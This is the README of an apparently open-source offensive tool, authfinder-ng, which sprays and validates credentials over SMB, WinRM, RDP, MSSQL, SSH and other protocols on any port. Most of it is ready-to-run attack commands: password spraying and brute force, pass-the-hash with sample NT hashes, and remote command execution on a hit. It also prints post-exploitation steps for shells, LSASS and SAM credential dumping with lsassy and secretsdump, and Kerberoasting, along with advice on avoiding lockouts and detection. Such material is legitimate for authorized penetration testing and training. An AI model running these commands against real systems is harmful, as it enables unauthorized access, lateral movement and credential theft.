# authfinder-ng v4.0

> **Multi-Protocol Credential Testing & Access Engine**
> Built for penetration testers, OSCP/CRTE students, and red teamers who need fast, reliable credential validation across every Windows and Linux protocol — on any port.

---

## Why authfinder-ng?

Most credential testers assume services run on default ports. In real engagements they don't.
`authfinder-ng` solves this by:

1. **Scanning ALL 65,535 ports** (via rustscan) — not just guessing defaults
2. **Fingerprinting services by name** (not port number) — WinRM on 55985 works just like 5985
3. **Caching scan results per host** — test new creds without re-scanning
4. **Listing every command before executing it** — full transparency, screenshot-ready
5. **Auto-detecting domain from SMB banner** — no need to specify `-d DOMAIN` manually

---

## Supported Protocols

| Protocol | Tool | Notes |
|----------|------|-------|
| SMB | `nxc smb` + `impacket-wmiexec` | Auth check + RCE if admin |
| WinRM | `nxc winrm` + `evil-winrm` | HTTP (5985) and HTTPS (5986) |
| WMI | `nxc wmi` + `impacket-wmiexec` | RPC-based execution |
| RDP | `nxc rdp` + `xfreerdp3` | Auth check + desktop command |
| MSSQL | `nxc mssql` + `impacket-mssqlclient` | Sysadmin check + xp_cmdshell |
| SSH | `nxc ssh` | Linux and Windows targets |
| FTP | `nxc ftp` + `hydra` | With anonymous fallback |
| LDAP | `nxc ldap` | AD user enumeration on hit |
| HTTP | `curl` + `hydra` | Basic auth detection |

---

## Installation

```bash
git clone https://github.com/YOUR_USERNAME/authfinder-ng.git
cd authfinder-ng
sudo cp authfinder-ng /usr/local/bin/authfinder-ng
sudo chmod +x /usr/local/bin/authfinder-ng

# Install all dependencies
authfinder-ng --install-tools
```

### Dependencies

| Tool | Required | Install |
|------|----------|---------|
| `netexec` / `nxc` | ✅ | `pipx install netexec` |
| `impacket` | ✅ | `pipx install impacket` |
| `evil-winrm` | ✅ | `gem install evil-winrm` |
| `nmap` | ✅ | `apt install nmap` |
| `rustscan` | Recommended | `apt install rustscan` |
| `hydra` | Optional | `apt install hydra` |
| `xfreerdp3` | Optional | `apt install freerdp3-x11` |
| `ldapsearch` | Optional | `apt install ldap-utils` |
| `kerbrute` | Optional | `go install github.com/ropnop/kerbrute@latest` |
| `masscan` | Optional | `apt install masscan` |
| `proxychains4` | Optional | `apt install proxychains4` |

---

## Quick Start

```bash
# Single credential — auto-scan, auto-detect domain
authfinder-ng 10.10.10.1 -u administrator -p 'Password123'

# Pass-the-hash (PTH)
authfinder-ng 10.10.10.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee

# User spray — same password, many users
authfinder-ng 10.10.10.1 -i users.txt -p 'Summer2024!'

# Full spray — every user × every password
authfinder-ng 10.10.10.1 -i users.txt -P passwords.txt -d CORP.LOCAL

# New creds on same host — scan cache loaded, NO re-scan
authfinder-ng 10.10.10.1 -u jsmith -p 'Welcome1'

# Force fresh scan
authfinder-ng 10.10.10.1 -u admin -p pass --rescan
```

---

## Usage

```
authfinder-ng <target> [auth-options] [options]
```

### Targets

```
10.10.10.1              Single IP
10.10.10.1-50           Dash range (last octet)
192.168.1.0/24          CIDR
targets.txt             File of IPs/ranges (# comments OK)
```

### Auth Options

```
-u  USER              Single username
-i  FILE              Username file (one per line)
-p  PASS              Single password
-P  FILE              Password file — creates cartesian spray with -i
-H  HASH              NT hash (pass-the-hash, auto-detected if 32 hex chars)
-f  FILE              Combined file: user:pass per line
-d  DOMAIN            Domain (auto-detected from SMB banner if omitted)
    --local-auth      Force local authentication (no domain)
```

### Scan Options

```
    --skip-scan       Skip port discovery — use all default ports
    --rescan          Force fresh scan (ignore 24h cache)
    --add-to-hosts    Auto-add discovered hostname to /etc/hosts
```

### Execution

```
-c  CMD               Command to run on success (default: whoami /all)
    --tools LIST      Target specific protocols: smb,winrm,wmi,rdp,mssql,ssh,ftp,ldap,http
    --run-all         Continue testing after first hit on a host
    --linux           Linux mode — SSH focus, runs: id && whoami && uname -a
    --no-next-steps   Hide post-exploitation guidance after hits
```

### Spray Options

```
    --bruteforce      Full user×pass bruteforce (default: safe round-robin spray)
    --delay N         Seconds between attempts — essential against lockout policies
    --lockout-thresh N  Pause after N per-user failures (default: 3)
```

### Misc

```
    --threads N       Parallel target threads (default: 5)
    --timeout N       Per-command timeout seconds (default: 22)
    --proxy URL       SOCKS5 proxy for pivoting: socks5://127.0.0.1:1080
    --report FILE     Save markdown report to file
    --check-tools     Verify all tool availability
    --install-tools   Auto-install all dependencies
-v                    Verbose / debug output
```

---

## Examples

### OSCP / Exam workflow

```bash
# 1. Enumerate host — first time
authfinder-ng 10.10.10.100 -u admin -p 'Password123' -d CORP.LOCAL

# 2. Found new creds on the box — skip rescan
authfinder-ng 10.10.10.100 -u svc_backup -p 'Backup2024!' 

# 3. Spray found password across whole subnet
authfinder-ng 192.168.1.0/24 -u administrator -p 'Password123' --delay 1

# 4. Spray user list found in SYSVOL
authfinder-ng 10.10.10.100 -i /tmp/domain_users.txt -p 'Company2024!' --delay 3

# 5. PTH after secretsdump
authfinder-ng 192.168.1.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# 6. Specific protocols only (fast)
authfinder-ng 10.10.10.100 -u admin -p pass --tools winrm,mssql

# 7. Save full report
authfinder-ng 10.10.10.100 -u admin -p pass --report /tmp/engagement_results.md
```

### Pivoting through a tunnel

```bash
# Start tunnel (e.g. ligolo-ng, chisel)
# Then use proxy flag
authfinder-ng 192.168.2.0/24 -i users.txt -P pass.txt --proxy socks5://127.0.0.1:1080
```

### Linux targets

```bash
# SSH spray
authfinder-ng 10.10.10.100 -i users.txt -P pass.txt --linux

# Specific SSH port
authfinder-ng 10.10.10.100 -u root -p toor --linux --tools ssh
# authfinder-ng discovers non-standard SSH port automatically via rustscan
```

### Combined credential file

```bash
# creds.txt format:
# admin:Password123
# jsmith:Welcome1
# sa:SqlPass2024

authfinder-ng 10.10.10.100 -f creds.txt -d CORP.LOCAL --report hit_report.md
```

---

## How It Works

### Phase 0 — Tool Verification
Checks every required and optional tool. Resolves binary variants:
- `nxc` / `netexec` / `crackmapexec`
- `xfreerdp3` / `xfreerdp`
- `impacket-psexec` / `psexec.py`

### Phase 1 — Port Discovery
```
rustscan -a TARGET --ulimit 5000 -b 2500   (scans all 65535 ports, ~3 seconds)
  └── nmap -sV -p <open_ports>              (service fingerprinting)
       └── parse_nmap() → service map       (port + name + product → protocol)
```
Fallback to `nmap --top-ports 2000` if rustscan not installed.

### Phase 2 — Service Mapping (non-standard port aware)
```
Port 55985  + service "http"  + product "Microsoft HTTPAPI"  → winrm
Port 2222   + service "ssh"   + product "OpenSSH 7.4"        → ssh
Port 33389  + service "ms-wbt-server"                        → rdp
Port 1435   + service "ms-sql-s"                             → mssql
```
Detection uses **port → service name → product string** in priority order.

### Phase 3 — Auto-Intelligence
- Grabs SMB banner → extracts `(domain:CORP.LOCAL)` and `(name:DC01)` automatically
- Tests null/guest/anonymous auth before using credentials
- Checks password lockout policy before starting spray

### Phase 4 — Auth Testing
For each credential × each discovered service:
```
[CMD] nxc smb 10.10.10.1 --port 445 -u 'admin' -p 'Password123' -d 'CORP.LOCAL'
    │ [+] 10.10.10.1  445  SMB  DC01  [*] Windows 10.0 Build 17763  [Pwn3d!]
    └── [HIT] SMB:445 — admin@10.10.10.1 — LOCAL ADMIN
```
Every command is printed **before** execution. All output shown inline.

### Phase 5 — Post-Exploitation Guide
On every hit, prints context-aware next steps:
- Interactive shell commands (wmiexec / evil-winrm / ssh)
- Credential dumping (lsassy / secretsdump / --sam / --lsa)
- AD attacks (Kerberoasting / AS-REP / BloodHound)
- Vulnerability checks (noPac / ZeroLogon / EternalBlue)
- Lateral movement (subnet spray / DCOM / WMI pivot)

### Phase 6 — Scan Cache
```
~/.cache/authfinder-ng/10_10_10_1.cache   (TTL: 24h)
```
Second run with new creds loads instantly — no re-scan.

---

## Output Example

```
[*] Loaded cached scan for 10.10.10.1 (scanned 2m ago) — use --rescan to refresh
[*] Hostname auto-detected: DC01
[*] Domain   auto-detected: CORP.LOCAL

▶ Auth Testing — 10.10.10.1
────────────────────────────────────────────────────────────
[*] Services : smb:445 winrm:5985 rdp:3389 wmi:135 ldap:389
[*] Users    : 3 | Passwords: 2
[*] Domain   : CORP.LOCAL

[→] SMB:445
    [CMD] nxc smb 10.10.10.1 --port 445 -u 'admin' -p 'Password123' -d 'CORP.LOCAL'
    ┌──────────────────────────────────────
    │ [+] 10.10.10.1  DC01  [Pwn3d!]
    └──────────────────────────────────────
[HIT] SMB:445 — admin@10.10.10.1 — LOCAL ADMIN

    [CMD] nxc smb 10.10.10.1 -u 'admin' -p 'Password123' -x 'whoami /all'
    ┌──────────────────────────────────────
    │ NT AUTHORITY\SYSTEM
    └──────────────────────────────────────

╔══ POST-EXPLOITATION — SMB:445 — admin@10.10.10.1 ══╗
  [1] Interactive Shell
    [CMD] impacket-wmiexec 'CORP.LOCAL/admin':'Password123'@10.10.10.1
    [CMD] evil-winrm -i 10.10.10.1 -u 'admin' -p 'Password123' -P 5985
  [2] Credential Dumping
    [CMD] nxc smb 10.10.10.1 -u 'admin' -p 'Password123' -M lsassy
    [CMD] impacket-secretsdump 'CORP.LOCAL/admin':'Password123'@10.10.10.1
  ...
```

---

## Scan Cache

The cache saves you from re-scanning hosts you've already discovered:

```bash
# First run — performs full scan (rustscan + nmap)
authfinder-ng 10.10.10.1 -u admin -p 'WrongPass'
# → Scans, finds: smb:445, winrm:5985, rdp:3389
# → Cache saved to ~/.cache/authfinder-ng/10_10_10_1.cache

# Found the real password — skip scan entirely
authfinder-ng 10.10.10.1 -u admin -p 'CorrectPass'
# → [*] Loaded cached scan (2m ago) — jumps straight to auth testing

# Force fresh scan after 24h or environment change
authfinder-ng 10.10.10.1 -u admin -p pass --rescan
```

---

## Lockout Protection

Default: **safe round-robin spray** — cycles 1 password per user per round.

```
Round 1: admin:Password123  →  jsmith:Password123  →  svc:Password123
Round 2: admin:Summer2024!  →  jsmith:Summer2024!  →  svc:Summer2024!
```

This matches AD spray best practices: no single user gets hit twice before others get their first attempt.

- Automatically checks `--pass-pol` before starting
- Tracks per-user failure count
- Pauses at `--lockout-thresh` (default: 3 failures per user)
- `--bruteforce` for full cartesian (when lockout isn't a concern)

---

## Project Structure

```
authfinder-ng/
├── authfinder-ng          # Main executable script
├── install.sh             # One-liner installer
├── README.md              # This file
├── CHANGELOG.md           # Version history
├── examples/
│   ├── users.txt          # Sample username list
│   ├── passwords.txt      # Sample password list
│   └── creds.txt          # Sample combined credential file
└── docs/
    └── protocols.md       # Per-protocol usage reference
```

---

## OPSEC Notes

- Check lockout policy **before** spraying: `nxc smb TARGET -u '' -p '' --pass-pol`
- Use `--delay 3` or higher in production environments
- `--safe-spray` (default) limits blast radius per user
- RDP attempts show in Security event log (Event ID 4625)
- WMI/SMBexec leave traces in System log
- Use `--tools winrm` or `--tools wmi` for quieter execution

---

## Related Tools (ADmoveLateral.sh)

The `original/ADmoveLaterla.sh` in this repo is a companion lateral movement reference tool covering:
WMI · WinRM · PsExec · Pass-the-Hash · Overpass-the-Hash · Pass-the-Ticket · DCOM · Golden Ticket · Shadow Copy

---

## Disclaimer

This tool is intended for **authorized penetration testing, CTF competitions, and security research only**.
Always obtain written authorization before testing systems you do not own.
The authors assume no liability for misuse.

---

## License

MIT License — see [LICENSE](LICENSE)
